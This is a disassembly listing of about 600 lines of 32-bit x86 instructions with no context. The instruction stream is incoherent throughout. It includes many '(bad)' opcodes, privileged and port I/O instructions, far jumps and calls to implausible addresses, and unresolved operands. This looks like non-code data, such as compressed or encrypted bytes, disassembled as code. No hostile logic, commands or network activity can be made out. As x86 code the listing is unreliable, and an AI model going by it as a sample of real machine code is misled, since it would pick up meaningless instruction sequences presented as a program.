  524f62:	pop    esp
  524f63:	gs pop es
  524f65:	mov    eax,0xdb260d82
  524f6a:	jae    0x524f10
  524f6c:	cwde   
  524f6d:	stos   BYTE PTR es:[edi],al
  524f6e:	cmp    dl,BYTE PTR [ebp+0x2f10288b]
  524f74:	jle    0x524f27
  524f76:	imul   BYTE PTR [ebx+0x1a]
  524f79:	cld    
  524f7a:	int3   
  524f7b:	mov    ah,0xd1
  524f7d:	mov    ah,0x76
  524f7f:	jmp    0xce4b0908
  524f84:	shl    ah,1
  524f86:	push   eax
  524f87:	mov    esi,0xe910d66d
  524f8c:	mov    bh,0x71
  524f8e:	mov    cl,0xaa
  524f90:	cs jns 0x524ffc
  524f93:	pop    esi
  524f94:	inc    ecx
  524f95:	rcl    BYTE PTR [edx],1
  524f97:	(bad)  
  524f98:	mul    DWORD PTR [ebx-0x6eafff1e]
  524f9e:	mov    esi,0xa662d4a7
  524fa3:	mov    al,ds:0x4e1b3dea
  524fa8:	fist   WORD PTR [ebp+0x45]
  524fab:	jo     0x524f7c
  524fad:	dec    BYTE PTR [eax-0x695c9a9d]
  524fb3:	gs xor eax,0x80d52771
  524fb9:	mov    dl,0x8c
  524fbb:	int    0x6f
  524fbd:	(bad)  
  524fbe:	xchg   edx,eax
  524fbf:	inc    edx
  524fc0:	fcom   DWORD PTR [ecx]
  524fc2:	mov    ds:0x2d3f8d1,eax
  524fc7:	mov    ecx,0x4d1d1cad
  524fcc:	les    edi,FWORD PTR [edi-0x9]
  524fcf:	xor    DWORD PTR [edi-0x28400cac],edi
  524fd5:	xor    ebp,DWORD PTR [ebx+0x2f2ce6e9]
  524fdb:	and    al,0x59
  524fdd:	jg     0x524fc8
  524fdf:	std    
  524fe0:	imul   eax,DWORD PTR [edi-0x76],0x3574151d
  524fe7:	fninit 
  524fe9:	inc    esp
  524fea:	jo     0x524f8b
  524fec:	sahf   
  524fed:	scas   eax,DWORD PTR es:[edi]
  524fee:	hlt    
  524fef:	mov    dl,0x3e
  524ff1:	push   esi
  524ff2:	iret   
  524ff3:	in     eax,dx
  524ff4:	sbb    al,BYTE PTR [ebx-0x48]
  524ff7:	add    al,0x23
  524ff9:	and    eax,0x9ff80750
  524ffe:	xor    DWORD PTR [esi],0x29
  525001:	leave  
  525002:	add    DWORD PTR [edx-0x279efe7c],esi
  525008:	icebp  
  525009:	xchg   ecx,eax
  52500a:	scas   al,BYTE PTR es:[edi]
  52500b:	mov    al,0x5b
  52500d:	sbb    ah,BYTE PTR [ebp+0x9]
  525010:	stos   DWORD PTR es:[edi],eax
  525011:	mov    ecx,0x9904b0cb
  525016:	jo     0x525022
  525018:	xor    al,0x4d
  52501a:	jl     0x525031
  52501c:	les    eax,FWORD PTR [ebp-0x13]
  52501f:	cmp    ch,BYTE PTR [ecx+0x4f]
  525022:	mov    esi,0xfd659231
  525027:	scas   eax,DWORD PTR es:[edi]
  525028:	clc    
  525029:	mov    eax,ds:0x9794ea78
  52502e:	test   eax,0xc964ca3c
  525033:	rcr    DWORD PTR [ebp-0x1f],1
  525036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525037:	inc    ebp
  525038:	pop    ecx
  525039:	arpl   WORD PTR [esi+0x24dcda3e],bx
  52503f:	sub    DWORD PTR [esi],esp
  525041:	gs aam 0xf8
  525044:	add    DWORD PTR [ebx+0x65],ecx
  525047:	sbb    BYTE PTR [ecx-0x73],dh
  52504a:	sbb    esp,0x27
  52504d:	pop    ss
  52504e:	xchg   ebx,eax
  52504f:	fisubr DWORD PTR [eax]
  525051:	fiadd  DWORD PTR [ecx]
  525053:	imul   ebx,DWORD PTR [ecx-0x1ab87633],0x50f9d400
  52505d:	xor    dh,BYTE PTR [ecx]
  52505f:	mov    esp,0x7cad379d
  525064:	jb     0x52508c
  525066:	ror    DWORD PTR [ebx+0x2771ce76],1
  52506c:	inc    edx
  52506d:	jle    0x5250b8
  52506f:	adc    dh,BYTE PTR [ebp+0x2d]
  525072:	jns    0x525035
  525074:	or     ah,bl
  525076:	xchg   esp,eax
  525077:	push   0x68
  525079:	xchg   esi,eax
  52507a:	jo     0x5250b2
  52507c:	int    0x54
  52507e:	arpl   WORD PTR [edi],bp
  525080:	retf   0xbefa
  525083:	jnp    0x525093
  525085:	std    
  525086:	sub    BYTE PTR [ebp-0x7591c214],0x44
  52508d:	add    DWORD PTR [edi+edi*8-0x21],edx
  525091:	(bad)  [ecx+0x33]
  525094:	mov    BYTE PTR [eax+0xa5ea30e],al
  52509a:	cmp    bh,BYTE PTR [edi+0x46]
  52509d:	(bad)  
  52509e:	aad    0xf0
  5250a0:	add    BYTE PTR [edx],bl
  5250a2:	add    dh,BYTE PTR [edx+0x551c2006]
  5250a8:	loope  0x525050
  5250aa:	jb     0x525083
  5250ac:	sub    al,0x98
  5250ae:	out    dx,eax
  5250af:	aad    0x37
  5250b1:	xor    eax,0x43643abd
  5250b6:	clc    
  5250b7:	cmp    DWORD PTR ds:[edi+0x46],edx
  5250bb:	jg     0x525046
  5250bd:	pop    es
  5250be:	and    DWORD PTR [ecx-0x3d753eb9],eax
  5250c4:	dec    eax
  5250c5:	sub    BYTE PTR [esi],ah
  5250c7:	inc    eax
  5250c8:	jb     0x52504c
  5250ca:	push   ebx
  5250cb:	mov    dh,0x4e
  5250cd:	cmp    eax,0x1a4ee43f
  5250d2:	inc    esi
  5250d3:	inc    edx
  5250d4:	mov    edi,ecx
  5250d6:	xlat   BYTE PTR ds:[ebx]
  5250d7:	and    BYTE PTR [edi],al
  5250d9:	dec    ebx
  5250da:	cmp    ah,al
  5250dc:	into   
  5250dd:	sbb    eax,DWORD PTR [edi-0x14]
  5250e0:	adc    eax,ebp
  5250e2:	pop    edx
  5250e3:	mov    al,ds:0x2a508cfd
  5250e8:	lahf   
  5250e9:	imul   ebx,edx,0x5e977b6a
  5250ef:	pop    esp
  5250f0:	inc    ebx
  5250f1:	cmp    DWORD PTR [edi+0x34ea184e],ecx
  5250f7:	ja     0x525151
  5250f9:	mov    dh,0xf1
  5250fb:	ficomp WORD PTR [edx-0x56]
  5250fe:	cmc    
  5250ff:	lods   eax,DWORD PTR ds:[esi]
  525100:	inc    esp
  525101:	dec    edi
  525102:	popa   
  525103:	cmp    ch,BYTE PTR [eax-0x4d]
  525106:	nop
  525107:	inc    ecx
  525108:	cmp    BYTE PTR [esi*2+0x527f9ce0],dl
  52510f:	sub    al,0x3c
  525111:	and    edx,ecx
  525113:	sbb    bh,BYTE PTR [esi]
  525115:	out    0x50,al
  525117:	out    dx,al
  525118:	dec    edi
  525119:	xchg   bl,bl
  52511b:	fucomp st(6)
  52511d:	push   eax
  52511e:	jge    0x5250d2
  525120:	push   es
  525121:	fisub  WORD PTR [ecx+0x7]
  525124:	dec    edx
  525125:	xlat   BYTE PTR ds:[ebx]
  525126:	shl    DWORD PTR [edi],0x7
  525129:	push   ds
  52512a:	or     ch,al
  52512c:	test   BYTE PTR [ebp-0x4f],dl
  52512f:	mov    esp,0x351065ca
  525134:	sub    ch,BYTE PTR [ebx-0x281c0bd1]
  52513a:	pusha  
  52513b:	js     0x52518c
  52513d:	out    dx,eax
  52513e:	jmp    0x5250c9
  525140:	push   esp
  525141:	push   ecx
  525142:	(bad)  
  525143:	or     eax,ecx
  525145:	test   eax,0xb44a5de3
  52514a:	sbb    eax,0x25299cd
  52514f:	popf   
  525150:	or     esi,esp
  525152:	outs   dx,BYTE PTR ds:[esi]
  525153:	aam    0xa1
  525155:	iret   
  525156:	pop    eax
  525157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  525158:	and    DWORD PTR [esi],ebp
  52515a:	pop    ebx
  52515b:	xor    BYTE PTR [esi-0x6e],ah
  52515e:	lods   eax,DWORD PTR ds:[esi]
  52515f:	mov    eax,ds:0xe4850f94
  525164:	xor    bl,BYTE PTR [esi-0xd4552b0]
  52516a:	dec    cx
  52516c:	dec    edi
  52516d:	adc    eax,0xf0c68335
  525172:	mov    WORD PTR [eax+0x5f],gs
  525175:	mov    ebx,DWORD PTR [eax]
  525177:	imul   edx,DWORD PTR [esi],0x47205435
  52517d:	jbe    0x525170
  52517f:	ja     0x52518b
  525181:	nop
  525182:	xchg   ecx,eax
  525183:	xchg   BYTE PTR fs:[esi],al
  525186:	jmp    0x525165
  525188:	aad    0x59
  52518a:	jns    0x52520b
  52518c:	jns    0x525121
  52518e:	mov    ebp,edx
  525190:	push   cs
  525191:	sub    bl,dh
  525193:	mov    eax,0xa6e4368a
  525198:	xor    bl,BYTE PTR [esi+eiz*2+0x30]
  52519c:	je     0x525123
  52519e:	jo     0x525147
  5251a0:	push   esi
  5251a1:	cli    
  5251a2:	ss push ecx
  5251a4:	pop    ss
  5251a5:	xor    BYTE PTR [eax+0x62eb253d],0x3a
  5251ac:	cmp    DWORD PTR ds:[eax-0x674a1ec8],edi
  5251b3:	stc    
  5251b4:	push   0x5b1a7666
  5251b9:	push   0xeb85c0ce
  5251be:	push   ebx
  5251bf:	(bad)  
  5251c0:	in     eax,dx
  5251c1:	cmp    eax,0xd62f34e7
  5251c6:	daa    
  5251c7:	cdq    
  5251c8:	aad    0x2
  5251ca:	cdq    
  5251cb:	jns    0x525214
  5251cd:	add    dh,BYTE PTR [eax]
  5251cf:	cmp    al,0x42
  5251d1:	jo     0x5251f4
  5251d3:	dec    ebp
  5251d4:	jg     0x525238
  5251d6:	in     al,dx
  5251d7:	cmp    BYTE PTR [esi-0x4217195],dh
  5251dd:	cdq    
  5251de:	out    dx,al
  5251df:	fmul   DWORD PTR [edx]
  5251e1:	ins    BYTE PTR es:[edi],dx
  5251e2:	retf   
  5251e3:	cmp    al,0x81
  5251e5:	xor    DWORD PTR ss:[esi+0x64fefe4b],0xffffffe9
  5251ed:	call   0xd3c6:0xa8339568
  5251f4:	mov    esi,DWORD PTR ds:0x83b9db1a
  5251fa:	es sub al,0xff
  5251fd:	mov    dl,0xf3
  5251ff:	cmp    dl,BYTE PTR [eax+0x12]
  525202:	loopne 0x525214
  525204:	pop    esp
  525205:	fcomp  DWORD PTR [ecx+0x5d]
  525208:	mov    ss,edx
  52520a:	rol    DWORD PTR [eax],cl
  52520c:	mov    ebx,0x97424984
  525211:	in     al,0xfe
  525213:	ret    
  525214:	and    al,0x2b
  525216:	shl    BYTE PTR [ebx+0x30],cl
  525219:	idiv   bh
  52521b:	pop    esp
  52521c:	or     DWORD PTR [esi+0x32ed41bc],ebx
  525222:	aaa    
  525223:	aas    
  525224:	ins    DWORD PTR es:[edi],dx
  525225:	inc    eax
  525226:	daa    
  525227:	arpl   WORD PTR [ebp-0xa],sp
  52522a:	inc    ebx
  52522b:	mov    ebx,0x83245947
  525230:	es ret 0x6f23
  525234:	daa    
  525235:	sub    BYTE PTR [edi],ah
  525237:	bound  edi,QWORD PTR [ecx]
  525239:	test   esi,eax
  52523b:	jecxz  0x525267
  52523d:	xor    al,0x89
  52523f:	push   ebp
  525240:	jns    0x52520f
  525242:	out    0xba,al
  525244:	stos   BYTE PTR es:[edi],al
  525245:	jle    0x525226
  525247:	add    BYTE PTR [ecx+0x5f],cl
  52524a:	out    dx,eax
  52524b:	push   cs
  52524c:	imul   ebp,DWORD PTR [esi+0x6],0xffffffb7
  525250:	push   ds
  525251:	push   eax
  525252:	or     al,al
  525254:	out    0x65,eax
  525256:	and    DWORD PTR [edx-0x723348e3],edx
  52525c:	jbe    0x525250
  52525e:	push   0xffffffee
  525260:	in     eax,dx
  525261:	and    eax,0x49ba4fde
  525266:	jnp    0x5251f6
  525268:	sbb    al,0x6
  52526a:	jbe    0x5252b5
  52526c:	in     al,0x75
  52526e:	(bad)  
  52526f:	fnstsw WORD PTR [esi]
  525271:	daa    
  525272:	push   ebx
  525273:	popa   
  525274:	adc    BYTE PTR [ebx-0x6c],ah
  525277:	lods   eax,DWORD PTR ds:[esi]
  525278:	adc    eax,0x95413617
  52527d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52527e:	aas    
  52527f:	cmp    BYTE PTR ss:[edi-0x31],ch
  525283:	addr16 pop ds
  525285:	(bad)  
  525286:	and    bh,BYTE PTR [eax-0x17]
  525289:	push   0x6378ed12
  52528e:	xor    BYTE PTR [ecx],al
  525290:	jp     0x52525b
  525292:	push   ecx
  525293:	aas    
  525294:	dec    esi
  525295:	cmp    esp,esi
  525297:	retf   
  525298:	daa    
  525299:	push   eax
  52529a:	adc    BYTE PTR ds:0x3a830691,cl
  5252a0:	shl    bl,cl
  5252a2:	test   al,0x83
  5252a4:	and    al,0xfe
  5252a6:	xor    eax,0x28707e35
  5252ab:	retf   0xa2a3
  5252ae:	cmp    DWORD PTR [edx],edx
  5252b0:	pusha  
  5252b1:	retf   
  5252b2:	dec    eax
  5252b3:	sub    ch,BYTE PTR [ebp-0x3c]
  5252b6:	pop    esp
  5252b7:	jbe    0x5252ef
  5252b9:	in     eax,dx
  5252ba:	add    edx,esi
  5252bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5252bd:	loope  0x52529c
  5252bf:	or     DWORD PTR [ebx-0x110b82df],edi
  5252c5:	push   ecx
  5252c6:	stos   BYTE PTR es:[edi],al
  5252c7:	add    al,0xef
  5252ca:	mov    eax,ecx
  5252cc:	inc    esp
  5252cd:	dec    edx
  5252ce:	push   ecx
  5252cf:	jnp    0x52530e
  5252d1:	pop    ebp
  5252d2:	xor    DWORD PTR [edx+edi*8+0x0],esp
  5252d6:	jmp    0xcb31a65d
  5252db:	je     0x5252dc
  5252dd:	xchg   esp,eax
  5252de:	push   ebp
  5252df:	mov    ch,0x4c
  5252e1:	mov    ah,0x50
  5252e3:	clc    
  5252e4:	lock or BYTE PTR [esi],ah
  5252e7:	test   eax,0x485470d1
  5252ec:	jae    0x5252a6
  5252ee:	mov    eax,ds:0x1d05d604
  5252f3:	call   0x60c2:0xc1fd3cc9
  5252fa:	mov    esp,0xad275a33
  5252ff:	xor    bh,cl
  525301:	loopne 0x5252b0
  525303:	icebp  
  525304:	stos   BYTE PTR es:[edi],al
  525305:	jmp    0x525309
  525307:	sbb    eax,0x1e8cb6ab
  52530c:	sbb    DWORD PTR [ecx-0x31f3d159],eax
  525312:	mov    dh,0xdc
  525314:	and    DWORD PTR [esi-0x3ec05eeb],esi
  52531a:	fwait
  52531b:	lods   eax,DWORD PTR ds:[esi]
  52531c:	sbb    ch,BYTE PTR [edi-0x4954a5f2]
  525322:	fist   WORD PTR [ebx-0x6d]
  525325:	xchg   ebp,eax
  525326:	shl    BYTE PTR [edi+ecx*1-0x14],cl
  52532a:	cld    
  52532b:	pop    ecx
  52532c:	data16 add bh,al
  52532f:	cs out dx,eax
  525331:	fisubr DWORD PTR [eax]
  525333:	inc    esi
  525334:	cli    
  525335:	call   0x2ecea935
  52533a:	dec    ebp
  52533b:	mov    ebx,0x56a34782
  525340:	aas    
  525341:	(bad)  
  525342:	retf   0xb07f
  525345:	adc    eax,0x79d9406f
  52534a:	cmp    bh,BYTE PTR [edi+0x39]
  52534d:	push   esi
  52534e:	lods   eax,DWORD PTR ds:[esi]
  52534f:	adc    eax,0x42cd6385
  525354:	inc    eax
  525355:	int    0xab
  525357:	adc    eax,0xca9fe991
  52535c:	ror    DWORD PTR [ebp+ebp*8-0x26],0x25
  525361:	jns    0x525321
  525363:	dec    esi
  525364:	sbb    eax,0x9cd82e81
  525369:	data16 sahf 
  52536b:	mov    dl,0xe7
  52536d:	push   ebx
  52536e:	dec    ah
  525370:	push   edx
  525371:	test   DWORD PTR [edi],ecx
  525373:	test   DWORD PTR [eax+0x1e40fdfd],0xb6602996
  52537d:	fbstp  TBYTE PTR ds:0x494f5759
  525383:	sub    BYTE PTR [eax+0x754516d6],0x91
  52538a:	jle    0x525347
  52538c:	pop    edx
  52538d:	mov    ebx,0x1a118c08
  525392:	aam    0xd9
  525394:	pop    ebp
  525395:	pushf  
  525396:	popf   
  525397:	jo     0x52536d
  525399:	outs   dx,DWORD PTR ds:[esi]
  52539a:	and    al,0x53
  52539c:	loop   0x525365
  52539e:	pop    ebp
  52539f:	sar    DWORD PTR [ebx+edi*2+0x23],cl
  5253a3:	stos   BYTE PTR es:[edi],al
  5253a4:	jge    0x525329
  5253a6:	xchg   ecx,eax
  5253a7:	add    BYTE PTR [ecx-0x35],0x75
  5253ab:	push   es
  5253ac:	or     WORD PTR [ebx+ecx*4-0x61],bx
  5253b1:	rcl    edx,0xf7
  5253b4:	pop    ebp
  5253b5:	shl    ebp,1
  5253b7:	jne    0x52535b
  5253b9:	push   edx
  5253ba:	out    0x60,al
  5253bc:	adc    eax,0x17a2b6f
  5253c1:	inc    ebx
  5253c2:	mov    ds:0x1c041f18,al
  5253c7:	xlat   BYTE PTR ds:[ebx]
  5253c8:	imul   eax,DWORD PTR [ebx+0x68],0x79
  5253cc:	rcl    BYTE PTR [eax],cl
  5253ce:	lods   al,BYTE PTR ds:[esi]
  5253cf:	lds    ecx,FWORD PTR gs:[esp+ebx*4-0x7b6f700e]
  5253d7:	add    eax,0xad75884
  5253dc:	clc    
  5253dd:	cmp    bh,BYTE PTR [edx]
  5253df:	mov    bh,0xa6
  5253e1:	xchg   BYTE PTR [ecx],ch
  5253e3:	dec    esp
  5253e4:	push   ds
  5253e5:	retf   0x7604
  5253e8:	mov    ebp,DWORD PTR [esi+0x3e3604d1]
  5253ee:	mov    ch,0x70
  5253f0:	mov    bh,0x91
  5253f2:	xor    eax,0x743b3a5d
  5253f7:	(bad)  
  5253f8:	in     eax,dx
  5253f9:	xchg   esp,eax
  5253fa:	lds    ebp,FWORD PTR [ebp+0x1e]
  5253fd:	jne    0x52544a
  5253ff:	mov    ecx,0x2730c23d
  525404:	(bad)  
  525405:	rol    ebp,1
  525407:	in     eax,0xe5
  525409:	mov    ah,0x71
  52540b:	push   cs
  52540c:	push   ebp
  52540d:	inc    edi
  52540e:	push   ebx
  52540f:	enter  0x181e,0x36
  525413:	fs fdiv st(1),st
  525416:	xchg   esi,eax
  525417:	fprem  
  525419:	aam    0xd0
  52541b:	mov    edi,0xa77f2427
  525420:	mov    ebp,0xcc271387
  525425:	cmp    ebp,esi
  525427:	scas   al,BYTE PTR es:[edi]
  525428:	stos   DWORD PTR es:[edi],eax
  525429:	test   DWORD PTR [ecx-0x3],ebx
  52542c:	push   esi
  52542d:	push   edi
  52542e:	inc    ecx
  52542f:	repz pop ss
  525431:	mov    ch,0xa4
  525433:	and    eax,0xf10ebc32
  525438:	inc    esi
  525439:	jnp    0x5253bf
  52543b:	xchg   edx,eax
  52543c:	daa    
  52543d:	and    eax,0xc77cccd1
  525442:	gs aad 0x47
  525445:	popa   
  525446:	mov    ebp,ss
  525448:	jecxz  0x525443
  52544a:	fisubr WORD PTR [esi-0x470efc01]
  525450:	mov    edx,0x87d99bea
  525455:	(bad)  
  525456:	jnp    0x52544f
  525458:	cmp    DWORD PTR [ecx],ebp
  52545a:	les    esi,FWORD PTR [eax]
  52545c:	mov    ch,0x14
  52545e:	and    bl,BYTE PTR [ebp-0x5c932ff6]
  525464:	push   esi
  525465:	sar    DWORD PTR [edi+0xf],cl
  525468:	sub    bh,al
  52546a:	call   0xa51a3885
  52546f:	jno    0x5254d4
  525471:	fsubp  st(0),st
  525473:	inc    edx
  525474:	fsub   st,st(2)
  525476:	in     eax,dx
  525477:	jecxz  0x525417
  525479:	fidiv  DWORD PTR [edi-0xb]
  52547c:	jae    0x52540f
  52547e:	pop    es
  52547f:	(bad)  
  525480:	icebp  
  525481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  525482:	out    0x7f,al
  525484:	xor    BYTE PTR [edx+esi*4+0x2f],0xf0
  525489:	in     eax,dx
  52548a:	test   eax,0x93a547d8
  52548f:	int3   
  525490:	cmp    BYTE PTR [ecx+0x3f],ch
  525493:	aas    
  525494:	sub    al,0xee
  525496:	sbb    al,0x87
  525498:	sbb    eax,0xbb8f13ad
  52549d:	pop    ss
  52549e:	jb     0x5254bf
  5254a0:	sub    ah,BYTE PTR [edi+0x326303f8]
  5254a6:	call   0x9014bc8
  5254ab:	mov    ah,0x6f
  5254ad:	adc    ah,ch
  5254af:	test   eax,0x703f46af
  5254b4:	ret    0x4c77
  5254b7:	call   0x290a:0xfcb222be
  5254be:	cmp    DWORD PTR [edx+0x1a],ecx
  5254c1:	push   cs
  5254c2:	sub    BYTE PTR [ebx+0x34],al
  5254c5:	fld    DWORD PTR [edi]
  5254c7:	stos   DWORD PTR es:[edi],eax
  5254c8:	nop
  5254c9:	xchg   BYTE PTR [ebx-0x13],cl
  5254cc:	pusha  
  5254cd:	fs sub ebp,ecx
  5254d0:	dec    esi
  5254d1:	pop    esi
  5254d2:	jmp    0x525508
  5254d4:	test   DWORD PTR [edx],esp
  5254d6:	hlt    
  5254d7:	mov    ecx,0xda4cfcb6
  5254dc:	push   ecx
  5254dd:	sahf   
  5254de:	dec    ebx
  5254df:	pushf  
  5254e0:	out    0x2c,al
  5254e2:	mov    ecx,0xc8f495fb
  5254e7:	pop    edi
  5254e8:	or     BYTE PTR [ebp+0x174665c6],cl
  5254ee:	push   ebp
  5254ef:	inc    BYTE PTR [ebx]
  5254f1:	pushf  
  5254f2:	push   edx
  5254f3:	in     eax,dx
  5254f4:	outs   dx,DWORD PTR ds:[esi]
  5254f5:	sbb    edi,DWORD PTR [eax+0x2408b0bf]
  5254fb:	pop    ebp
  5254fc:	push   ebx
  5254fd:	(bad)  
  5254fe:	fiadd  WORD PTR [ebx+ebx*4-0x17426ab8]
  525505:	pop    eax
  525506:	stc    
  525507:	mov    bl,0xd
  525509:	stos   BYTE PTR es:[edi],al
  52550a:	add    al,0x39
  52550c:	xchg   esp,eax
  52550d:	retf   0xc647
  525510:	jbe    0x52554c
  525512:	push   ebx
  525513:	adc    bl,BYTE PTR [ebx]
  525515:	sbb    DWORD PTR [edi-0x48],0xc7d53b3
  52551c:	jb     0x5254a7
  52551e:	mov    edi,0xc827c346
  525523:	add    dh,al
  525525:	bound  ebx,QWORD PTR [ecx]
  525527:	or     al,0x68
  525529:	in     eax,0x35
  52552b:	sar    edi,cl
  52552d:	int    0xf4
  52552f:	out    0xed,eax
  525531:	je     0x525515
  525533:	je     0x525549
  525535:	scas   eax,DWORD PTR es:[edi]
  525536:	mov    WORD PTR [edx-0x27795d2d],?
  52553c:	scas   eax,DWORD PTR es:[edi]
  52553d:	lea    esp,[esi+0x37]
  525540:	rcr    BYTE PTR [ebx+ecx*1+0x5c6037b7],cl
  525547:	sbb    DWORD PTR [eax+0x37],ebp
  52554a:	or     ecx,DWORD PTR [edi-0x7f773144]
  525550:	mov    ch,ch
  525552:	or     eax,0xbb143a6f
  525557:	add    eax,0x4fb5c8de
  52555c:	jmp    0x219b:0xf7a8f58c
  525563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  525564:	enter  0xb6e1,0xd1
  525568:	pushf  
  525569:	push   ebx
  52556a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52556b:	sub    edi,DWORD PTR [eax+eax*8-0x9b54cd9]
  525572:	ficom  WORD PTR [esp+ebx*4-0x77]
  525576:	ret    
  525577:	fnop   
  525579:	dec    esp
  52557a:	es jecxz 0x52554c
  52557d:	adc    cl,BYTE PTR [esi]
  52557f:	dec    ebp
  525580:	jno    0x52552f
  525582:	aas    
  525583:	sbb    ecx,edi
  525585:	mov    al,0x4a
  525587:	das    
  525588:	(bad)  
  525589:	push   ebp
  52558a:	sub    eax,DWORD PTR [edi-0x40]
  52558d:	jl     0x525520
  52558f:	rol    ch,0xb3
  525592:	xchg   ecx,eax
  525593:	hlt    
  525594:	xor    eax,0xd912d2f5
  525599:	jecxz  0x525575
  52559b:	dec    ebp
  52559c:	dec    esi
  52559d:	loope  0x5255a9
  52559f:	jge    0x52561b
  5255a1:	shl    DWORD PTR [esi-0x4a],0x70
  5255a5:	jmp    0x3514:0x883ad731
  5255ac:	adc    al,dl
  5255ae:	popf   
  5255af:	outs   dx,DWORD PTR ds:[esi]
  5255b0:	mov    WORD PTR [edi+eiz*2],gs
  5255b3:	cmp    edi,DWORD PTR [eax]
  5255b5:	xchg   esi,eax
  5255b6:	mov    esi,0xabf3a364
  5255bb:	enter  0xb129,0x10
  5255bf:	repnz dec edx
  5255c1:	int3   
  5255c2:	xchg   edx,eax
  5255c3:	ror    BYTE PTR [esi+0x2d4d30f6],0xa6
  5255ca:	cmp    eax,0x7117c4c
  5255cf:	inc    esi
  5255d0:	cli    
  5255d1:	inc    eax
  5255d2:	pusha  
  5255d3:	out    0x25,al
  5255d5:	jecxz  0x5255ec
  5255d7:	sar    bh,1
  5255d9:	jge    0x52558a
  5255db:	ins    BYTE PTR es:[edi],dx
  5255dc:	inc    ebx
  5255dd:	push   cs
  5255de:	mov    WORD PTR [ebx-0x3e8f79eb],?
  5255e4:	xchg   esi,eax
  5255e5:	inc    edi
  5255e6:	pop    ebx
  5255e7:	stc    
  5255e8:	out    0x74,al
  5255ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5255eb:	lahf   
  5255ec:	sub    eax,0xb752bd5
  5255f1:	push   esi
  5255f2:	xchg   edi,eax
  5255f3:	lock push esp
  5255f5:	push   es
  5255f6:	mov    ebx,0xc55aa9b3
  5255fb:	fisubr DWORD PTR [esi+ebx*4]
  5255fe:	fwait
  5255ff:	int    0xed
  525601:	shl    ecx,0x33
  525604:	xlat   BYTE PTR ds:[ebx]
  525605:	pop    ds
  525606:	retf   
  525607:	pop    ebx
  525608:	fwait
  525609:	mov    ch,0xfe
  52560b:	bswap  esi
  52560d:	jbe    0x5255eb
  52560f:	outs   dx,DWORD PTR ds:[esi]
  525610:	cmp    edi,DWORD PTR [esi+eiz*4+0x63]
  525614:	sbb    eax,0x6bd4fe34
  525619:	pop    es
  52561a:	sub    eax,0x449eea84
  52561f:	lock ss call 0xafa3:0x39eb3fd7
  525628:	and    DWORD PTR [edx],0x62
  52562b:	xor    BYTE PTR [edi-0x4c],dh
  52562e:	pop    ebp
  52562f:	cwde   
  525630:	ins    BYTE PTR es:[edi],dx
  525631:	call   0xa84e5cae
  525636:	add    eax,0x51bda1e
  52563b:	cmp    edx,edx
  52563d:	xchg   edx,eax
  52563e:	cli    
  52563f:	and    DWORD PTR [ebp+0x63c3ff8c],0xffffffea
  525646:	inc    ebx
  525647:	outs   dx,DWORD PTR ds:[esi]
  525648:	xchg   ebp,eax
  525649:	xor    DWORD PTR [esi+0x61d4dbd5],esi
  52564f:	push   esi
  525650:	fisttp WORD PTR [edi-0x137214a4]
  525656:	adc    BYTE PTR [ebx],al
  525658:	sar    BYTE PTR [eax+0x29],1
  52565b:	(bad)  
  52565c:	pusha  
  52565d:	xchg   ebp,eax
  52565e:	fld    QWORD PTR [eax+0x785f2382]
  525664:	mov    DWORD PTR [ecx],esp
  525666:	neg    DWORD PTR [ecx]
  525668:	cdq    
  525669:	mov    eax,ds:0x2b994b50
  52566e:	popa   
  52566f:	inc    ecx
  525670:	scas   eax,DWORD PTR es:[edi]
  525671:	pushf  
  525672:	jne    0x525638
  525674:	(bad)  
  525675:	cmp    ah,BYTE PTR [ecx*1+0x73971f10]
  52567c:	push   edi
  52567d:	pop    esp
  52567e:	and    BYTE PTR [ebp+0x6dfcb77a],cl
  525684:	call   DWORD PTR [esi+0x22]
  525687:	nop
  525688:	cdq    
  525689:	mov    al,0x5f
  52568b:	je     0x525638
  52568d:	push   ss
  52568e:	mov    BYTE PTR [eax+0x43],dh
  525691:	inc    ebx
  525692:	xchg   ebx,eax
  525693:	sbb    DWORD PTR [ebx],0xffffffc7
  525696:	add    BYTE PTR [edx+0x3996a65d],bh
  52569c:	mov    edi,0xaadda598
  5256a1:	retf   0x99
  5256a4:	in     al,dx
  5256a5:	push   es
  5256a6:	daa    
  5256a7:	inc    eax
  5256a8:	xor    DWORD PTR [esi],ebp
  5256aa:	stos   BYTE PTR es:[edi],al
  5256ab:	call   0x123263dc
  5256b0:	lea    eax,[ebx+0x78]
  5256b3:	dec    BYTE PTR [ebp-0x2431f194]
  5256b9:	mov    al,ds:0x429cae26
  5256be:	imul   eax,DWORD PTR [bp+di+0x1c88],0xfffffffb
  5256c4:	cmp    BYTE PTR [edi-0x264b7f4b],ch
  5256ca:	fcomip st,st(1)
  5256cc:	dec    edi
  5256cd:	in     eax,dx
  5256ce:	fwait
  5256cf:	das    
  5256d0:	and    eax,0x57dca914
  5256d5:	das    
  5256d6:	enter  0x5f09,0x73
  5256da:	(bad)  
  5256db:	mov    edi,0xc05c0018
  5256e0:	or     bh,BYTE PTR [ecx+0x6f]
  5256e3:	pop    esp
  5256e4:	out    0x7a,eax
  5256e6:	push   esi
  5256e7:	test   al,0x2b
  5256e9:	cdq    
  5256ea:	sbb    eax,0x17c854e1
  5256ef:	imul   eax,DWORD PTR [ebp-0x7f930acb],0x6e
  5256f6:	aam    0x4e
  5256f8:	fwait
  5256f9:	push   edx
  5256fa:	enter  0x2cb3,0x22
  5256fe:	cmp    DWORD PTR [eax],ebx
  525700:	je     0x52569c
  525702:	jmp    0xbf0d39b3
  525707:	push   esi
  525708:	adc    BYTE PTR [ecx-0xa3d2c50],bl
  52570e:	out    0x3c,eax
  525710:	or     edi,DWORD PTR [edx-0x5]
  525713:	fsub   DWORD PTR [esi]
  525715:	adc    eax,0xd4281632
  52571a:	dec    eax
  52571b:	ja     0x525724
  52571d:	lock mov eax,ds:0x952688c0
  525723:	sub    DWORD PTR [eax-0x4870121d],ebx
  525729:	mov    ebp,0xc6e342d4
  52572e:	mov    WORD PTR [edx+0x59],?
  525731:	popa   
  525732:	shr    BYTE PTR [ebp-0x7c424e7b],cl
  525738:	mov    ebx,0x6b1793e0
  52573d:	xchg   esp,eax
  52573e:	inc    edx
